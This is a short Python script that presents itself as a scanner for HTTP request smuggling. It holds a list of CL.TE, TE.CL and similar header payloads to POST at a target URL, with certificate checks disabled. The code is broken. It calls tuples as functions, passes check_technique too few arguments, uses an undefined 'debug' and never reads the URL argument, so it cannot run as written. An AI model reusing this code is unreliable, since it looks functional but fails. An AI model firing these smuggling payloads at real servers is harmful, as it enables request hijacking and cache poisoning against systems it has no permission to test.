#! /usr/bin/env python3
# -*- coding: utf-8 -*-
# Author: cbk914
import requests
import argparse

# Define the argument parser
parser = argparse.ArgumentParser(description="Check a URL for request smuggling vulnerabilities.")
parser.add_argument("-u", "--url", help="The target URL", required=True)
parser.add_argument("-d", "--debug", help="Print debug information", action="store_true")
args = parser.parse_args()

# Define the request smuggling techniques to try
techniques = [
    ("TE", "Transfer-Encoding: chunked\r\nTransfer-Encoding: identity"),
    ("CL.TE", "Content-Length: 0\r\nTransfer-Encoding: chunked\r\n\r\n1\r\nZ\r\nQ"),
    ("TE.CL", "Transfer-Encoding: chunked\r\nContent-Length: 3\r\n\r\nZ\r\n0\r\n\r\n"),
    ("FE", "Transfer-Encoding: chunked\r\nContent-Length: 4\r\n\r\n0\r\nGET / HTTP/1.1\r\n\r\n"),
    ("CRLF", "Transfer-Encoding: chunked\r\nContent-Length: 4\r\n\r\n0\r\n\r\nHTTP/1.1 200 OK\r\n\r\n")
]

# Set up the requests session
session = requests.Session()
session.verify = False

# Send a request with a custom payload and check the response
def check_technique(url, technique):
    try:
        print(f"[*] Testing technique: {technique.__name__}")
        session = requests.Session()
        response = session.request("POST", url, headers=technique())
        if response.status_code == 400:
            if "Content-Length" in response.headers:
                clength = response.headers["Content-Length"]
                session.headers.update({"Content-Length": str(len(response.content) + int(clength))})
                response = session.request("POST", url, headers=technique())
                if response.status_code == 200:
                    print(f"[+] Vulnerable to {technique.__name__}")
                    return True
        return False
    except requests.exceptions.RequestException as e:
        if debug:
            print(f"[!] Request error: {e}")
        return False


# Try all the techniques and print a message if any are successful
technique_found = False
for technique in techniques:
    if check_technique(technique):
        technique_found = True

# Print a message if no vulnerability is found
if not technique_found:
    print("No vulnerability found")
